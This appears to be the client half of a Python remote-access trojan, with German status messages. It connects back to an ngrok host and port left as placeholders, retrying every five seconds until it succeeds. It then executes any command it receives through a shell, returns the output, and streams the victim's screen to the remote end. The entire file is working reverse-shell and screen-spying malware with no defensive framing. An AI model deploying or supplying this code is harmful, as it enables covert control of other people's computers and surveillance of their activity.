import socket
import threading
from PIL import ImageGrab
import subprocess
import cv2
import time
import numpy as np


while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(('HERE THE NGROK TCP', HERE THE NGROK PORT))
        print('Verbindung hergestellt.')
        break
    except socket.error as e:
        print('Verbindung fehlgeschlagen. Warte 5 Sekunden und versuche erneut...')
        time.sleep(5)

print('Sender gestartet. Warte auf Verbindungen...')


def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout.encode()
        client.sendall(output)
    except Exception as e:
        error_message = str(e).encode()
        client.sendall(error_message)


def receive_commands():
    while True:
        data = client.recv(1024).decode()

        if not data:
            break

        print('Befehl empfangen:', data)

        execute_command(data)


def send_screen():
    while True:
        try:
            img = ImageGrab.grab()
            img = img.resize((1000, 650))

            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

            _, img_encoded = cv2.imencode('.jpg', frame)

            img_size = len(img_encoded)

            client.sendall(img_size.to_bytes(8, byteorder='big'))

            client.sendall(img_encoded)

        except Exception as e:
            print('Fehler bei der Übertragung des Bildschirms:', str(e))
            break


while True:
    send_screen_thread = threading.Thread(target=send_screen)
    send_screen_thread.daemon = True
    send_screen_thread.start()
    receive_commands_thread = threading.Thread(target=receive_commands)
    receive_commands_thread.daemon = True
    receive_commands_thread.start()
    receive_commands_thread.join()